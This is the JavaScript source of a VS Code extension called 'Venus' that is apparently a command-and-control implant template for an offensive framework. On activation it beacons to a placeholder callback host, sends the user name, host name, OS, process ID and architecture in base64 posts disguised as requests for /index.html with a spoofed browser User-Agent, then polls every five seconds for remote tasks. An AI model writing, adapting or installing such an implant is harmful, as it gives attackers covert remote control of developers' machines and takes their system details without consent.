const vscode = require('vscode');
const os = require('os');
const url = require('url');

const axios = require('axios').default;

const outchan = vscode.window.createOutputChannel("Venus");

const payloadUUID = "REPLACE_PAYLOAD_UUID"

const baseURL = new url.URL('callback_host');
baseURL.port = 'callback_port';
const client = axios.create({
	baseURL: baseURL.toString(),
	responseType: 'json',
	timeout: 1000,
	headers: {
		'Accept': 'application/json',
		'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko'
	}
});

function composeRequest(uuid, data) {
	const json = JSON.stringify(data)
	const buff = Buffer.from(uuid + json, 'utf-8');
	return buff.toString('base64');
}

/**
 * @param {import("axios").AxiosResponse<any>} response
 */
function parseResponse(response) {
	const decodedResponse = Buffer.from(response.data.toString('utf-8'), 'base64').toString('utf-8')
	return JSON.parse(decodedResponse.slice(36))
}

/**
 * @param {vscode.ExtensionContext} context
 */
function checkIn(context) {
	const checkinData = {
		"action": "checkin",
		"uuid": payloadUUID,
	  "ip": "127.0.0.1",
	  "os": process.platform,
	  "user": os.userInfo().username,
	  "host": os.hostname(),
	  "pid": process.pid,
	  "architecture": os.arch(),
	  "domain": ""
	}
	const encoded_checkin = composeRequest(payloadUUID, checkinData)

	client.post('/index.html', encoded_checkin)
		.then(function (response) {
			const checkinResponse = parseResponse(response)

			const callbackUUID = checkinResponse['id'];
			context.globalState.update('productID', callbackUUID);
			outchan.append("\nGot Callback ID: " + callbackUUID + "\n");
		})
		.catch(function (error) {
			outchan.append("\nCHECKIN ERROR\n");
			outchan.append("\n" + error.message + "\n");
		});
}

function getTasking(context) {
	const callbackUUID = context.globalState.get('productID')

	const taskingData = {
		"action": "get_tasking",
		"tasking_size": -1
	}
	const encoded_request = composeRequest(callbackUUID, taskingData);

	client.post('/index.html', encoded_request)
		.then(function (response) {
			const taskingResponse = parseResponse(response)
			outchan.append("\n<- GOT TASKING\n");

			handleTasks(context, taskingResponse.tasks)
		})
		.catch(function (error) {
			outchan.append("\nGET TASKING ERROR\n");
			outchan.append(`${error.message}`);
		});
}

function handleTasks(context, tasks) {
	const callbackUUID = context.globalState.get('productID')

	for (const task of tasks) {
		const taskID = task['id']
		const command = task['command']
		const parameters = task['parameters']

		if (command == 'current_user') {
			outchan.append("\nTask ID: " + taskID + "\n");
			outchan.append("\n" + os.userInfo().username + "\n");
			const output = os.userInfo().username
			postTaskResponse(callbackUUID, taskID, output)
		}
	}
}

function postTaskResponse(uuid, taskID, output) {
	const taskingData = {
		"action": "post_response",
		"responses": [
			{ "task_id": taskID, "completed": true, "user_output": output }
		]
	}
	const encoded_request = composeRequest(uuid, taskingData);

	client.post('/index.html', encoded_request)
		.then(function (response) {
			const taskingResponse = parseResponse(response)
			outchan.append(`${JSON.stringify(taskingResponse)}`);
		})
		.catch(function (error) {
			outchan.append(`${error.message}`);
		});
}

/**
 * @param {vscode.ExtensionContext} context
 */
function activate(context) {
	const callbackUUID = context.globalState.get('productID')

	if (callbackUUID != null) {
		outchan.append("\nExisting Callback ID: " + callbackUUID + "\n");
		setInterval(getTasking, 5000, context);
	} else {
		checkIn(context);
		setInterval(getTasking, 5000, context);
	}
}

function deactivate() {}

module.exports = {
	activate,
	deactivate
}
